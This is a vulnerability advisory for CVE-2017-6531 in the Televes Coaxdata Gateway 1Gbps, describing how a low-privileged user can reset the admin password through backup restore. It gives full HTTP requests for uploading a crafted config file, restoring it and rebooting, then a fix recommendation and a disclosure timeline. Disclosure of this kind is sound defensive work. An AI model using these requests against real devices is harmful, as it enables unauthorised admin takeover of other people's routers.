# CVE-2017-6531: Unrestricted backup restore in Televes Coaxdata Gateway 1Gbps
## Software
[![](https://img.shields.io/badge/Attack%20Vector-Remote-red?style=flat-square)]() [![](https://img.shields.io/badge/Privileges%20Required-Low-yellow?style=flat-square)]() [![](https://img.shields.io/badge/User%20Interaction-No-red?style=flat-square)]()

__Vendor:__ Televes<br>
__Vendor URL:__ https://www.televes.com<br>
__Versions affected:__ Televes Coaxdata Gateway 1Gbps<br>
__Discovered by:__ Pedro Andujar ([@pandujar](https://twitter.com/pandujar))<br>
__Public fix:__ Yes<br>
__Proof of Concept:__ No<br>


## Summary
A restricted user can update the configuration via "backup restore" functionality.

## Details
An authenticated low privileged user can modify the Admin password modifying the configuration file and updating it. Steps to reproduce:

1. Update configuration file with new password
```
POST /ReadFile.cgi HTTP/1.1

Host: <target>
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://<target>/resetrouter.shtml?DeviceInfo.AdditionalConfigVersion=default_cfg_v1.02.0014
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------66789582480853432558488077
Content-Length: 42533


-----------------------------66789582480853432558488077
Content-Disposition: form-data; name="cfgfile"; filename="s"
Content-Type: application/octet-stream


InternetGatewayDevice.DeviceInfo.X_ATH-COM_TeleComAccount.Password -m 1 -d <NEW_PASSWORD_HERE>


-----------------------------66789582480853432558488077
Content-Disposition: form-data; name="LoadCfgFile"

Load
-----------------------------66789582480853432558488077--

```

2. Restore the configuration

```http://<target>/result.shtml?method=LoadCfgFile&result=0&cfgfile=/tmp/s1488261988```

3. Reboot the device

```http://<target>/result.shtml?method=Reboot```

## Impact
This vulnerability can be exploited to do an account takeover of the admin user.

## Recommendation
Update the firmware to last version and block the adminsitration web interface on the internet or untrusted networks.

## Timeline
* 27/2/2017 - Reported vulnerability to vendor
* 28/2/2017 - Technical details sent on a 2nd contact attempt
* 01/3/2017 - Manufacturer acknowledge the issues and stats that restricted user would be removed from future releases
* 13/7/2017 - Follow up email related to resolution. No response
* 20/7/2017 - Public Disclosure

#

[![](https://img.shields.io/badge/www-blackarrow.net-E5A505?style=flat-square)](https://www.blackarrow.net) [![](https://img.shields.io/badge/twitter-@BlackArrowSec-00aced?style=flat-square&logo=twitter&logoColor=white)](https://twitter.com/BlackArrowSec) [![](https://img.shields.io/badge/linkedin-@BlackArrowSec-0084b4?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/company/blackarrowsec/)